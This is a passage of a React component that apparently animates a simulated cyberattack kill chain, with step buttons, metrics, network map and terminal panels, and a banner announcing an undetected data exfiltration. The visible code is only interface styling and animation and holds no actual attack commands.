                      animate={{ opacity: 1, height: "auto" }}
                      exit={{ opacity: 0, height: 0 }}
                      className={`text-center text-[8px] leading-tight ${isActive ? "text-red-300/70" : "text-gray-500"}`}
                    >
                      {step.result}
                    </motion.span>
                  )}
                </AnimatePresence>
                {isActive && (
                  <motion.span className="absolute -top-0.5 -right-0.5 h-2 w-2 rounded-full bg-red-500"
                    animate={{ scale: [1, 1.6, 1], opacity: [1, 0.3, 1] }}
                    transition={{ duration: 1.2, repeat: Infinity }} />
                )}
              </motion.button>
              {i < STEPS.length - 1 && (
                <motion.div className="mx-1 hidden sm:flex items-center" animate={{ opacity: active > i ? 1 : 0.15 }}>
                  <svg className="h-3 w-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 20 12">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M1 6h18m-5-5l5 5-5 5" />
                  </svg>
                </motion.div>
              )}
            </div>
          );
        })}
      </div>

      {/* ─── Live Metrics ─── */}
      <AttackMetrics activeStep={active} done={done} />

      {/* ─── Network Topology ─── */}
      <NetworkMap activeStep={active} />

      {/* ─── Terminal ─── */}
      <Terminal
        lines={current ? current.cmd : []}
        label={current ? current.label : "Waiting..."}
        active={active >= 0}
        stepColor={current ? current.color : "#6272a4"}
      />

      {/* ─── Result Banner ─── */}
      <AnimatePresence>
        {done && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0 }}
            className="flex items-center gap-3 sm:gap-4 rounded-xl border border-red-500/25 bg-gradient-to-r from-red-500/[0.06] to-transparent px-3 sm:px-5 py-3 sm:py-4"
          >
            <motion.div
              className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-red-500/15 ring-2 ring-red-500/25"
              animate={{ scale: [1, 1.06, 1] }}
              transition={{ duration: 2, repeat: Infinity }}
            >
              <svg className="h-5 w-5 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                  d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 16.5c-.77.833.192 2.5 1.732 2.5z" />
              </svg>
            </motion.div>
            <div>
              <p className="text-sm font-bold text-red-300">Full Kill Chain Completed — Zero Detection</p>
              <p className="mt-0.5 text-[11px] text-gray-500">
                4.2 MB of sensitive data exfiltrated. No DLP, no SIEM alert, no egress block triggered.
              </p>
            </div>
            <motion.div className="ml-auto hidden md:flex items-center gap-1.5 rounded-full border border-red-500/20 bg-red-500/10 px-3 py-1"
              animate={{ opacity: [0.5, 1, 0.5] }} transition={{ duration: 2, repeat: Infinity }}>
              <span className="h-1.5 w-1.5 rounded-full bg-red-500" />
              <span className="text-[9px] font-bold text-red-400">BREACH</span>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
